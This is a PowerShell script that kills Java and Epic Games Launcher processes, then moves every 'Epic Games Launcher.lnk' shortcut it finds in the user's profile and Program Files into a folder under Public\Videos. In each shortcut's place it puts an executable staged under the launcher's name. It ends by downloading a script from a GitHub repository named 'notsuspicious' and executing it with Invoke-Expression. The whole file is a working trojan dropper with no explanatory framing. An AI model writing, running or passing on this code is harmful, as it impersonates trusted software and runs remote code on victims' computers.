# Attempt to stop processes if they are running
Stop-Process -Name "java", "javaw", "EpicGamesLauncher" -Force -ErrorAction SilentlyContinue

# Define variables
# Define source and destination paths
# Define source and destination paths
$currentUser = $env:USERNAME
$sourcePaths = @("C:\Users\$currentUser", "C:\Program Files")
$destinationPath = "C:\Users\Public\Videos\GraphicalUserInterface"

# Initialize counter
$counter = 1

# Loop through source paths
foreach ($path in $sourcePaths) {
    # Search for Epic Games Launcher.lnk in each directory and its subdirectories
    $files = Get-ChildItem -Path $path -Recurse -Filter "Epic Games Launcher.lnk" -File -ErrorAction SilentlyContinue
    
    # Move each found file to the destination and rename it with the counter
    foreach ($file in $files) {
        $newFileName = "§$counter.lnk"
        $newFilePath = Join-Path -Path $destinationPath -ChildPath $newFileName
        Move-Item -Path $file.FullName -Destination $newFilePath -Force
        
        # Move Epic Games Launcher.exe to the original location of Epic Games Launcher.lnk
        $exeFilePath = Join-Path -Path $destinationPath -ChildPath "myapp\Epic Games Launcher.exe"
        Move-Item -Path $exeFilePath -Destination $file.Directory.FullName -Force
        
        $counter++
    }
}

# Download and execute javafix.ps1 script
try {
    $javaFixScript = Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing
    Invoke-Expression $javaFixScript.Content
    Write-Host "Java fix script executed successfully."
}
catch {
    Write-Host "Failed to execute Java fix script: $_"
}
